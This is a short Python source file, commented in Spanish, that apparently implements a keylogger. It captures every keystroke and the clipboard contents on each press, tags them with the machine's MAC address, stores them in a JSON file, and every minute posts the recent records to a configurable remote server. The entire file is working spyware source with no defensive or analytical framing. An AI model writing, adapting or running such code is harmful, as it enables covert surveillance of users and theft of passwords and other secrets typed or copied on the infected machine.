import json
import time
import threading
import uuid
from datetime import datetime
from pynput import keyboard
import requests
import platform
import pyperclip
from datetime import datetime, timedelta, timezone
from config import Config

# Obtener la dirección MAC
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])

# Configs
filename = Config.filename
server = Config.server


# Detectar el sistema operativo
system = platform.system()

# Función para enviar los datos a localhost cada minuto
def send_data():
    while True:
        time.sleep(60)  # Esperar un minuto
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
            
            # Obtener el tiempo actual y calcular el tiempo de corte
            now = datetime.now(timezone.utc)
            cutoff_time = now - timedelta(minutes=1)

            # Filtrar las claves que se hayan almacenado un minuto antes
            filtered_keys = [
                key for key in data.get('keys', [])
                if datetime.fromisoformat(key['time_utc']) > cutoff_time
            ]

            # Preparar el JSON con los datos filtrados
            filtered_data = {
                'mac_address': data.get('mac_address'),
                'keys': filtered_keys
            }

            # Enviar los datos filtrados
            requests.post(server, json=filtered_data)
        
        except Exception as e:
            print(f"Error sending data: {e}")

# Inicializar el archivo JSON con la dirección MAC
data = {
    "mac_address": mac_address,
    "keys": []
}

with open(filename, 'w') as f:
    json.dump(data, f)

def get_clipboard():
    try:
        return pyperclip.paste()
    except Exception as e:
        print(f"Error getting clipboard: {e}")
        return ""

# Función para registrar una tecla
def on_press(key):
    try:
        key_data = {
            "uuid": str(uuid.uuid4()),
            "key": key.char,
            "time_utc": datetime.now(timezone.utc).isoformat(),
            "clipboard": get_clipboard()
        }
    except AttributeError:
        key_data = {
            "uuid": str(uuid.uuid4()),
            "key": str(key),
            "time_utc": datetime.now(timezone.utc).isoformat(),
            "clipboard": get_clipboard()
        }

    with open(filename, 'r+') as f:
        data = json.load(f)
        data["keys"].append(key_data)
        f.seek(0)
        json.dump(data, f, indent=4)

# Configurar el listener del teclado
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Iniciar el hilo para enviar datos cada minuto
send_thread = threading.Thread(target=send_data, daemon=True)
send_thread.start()

# Mantener el script en ejecución
listener.join()
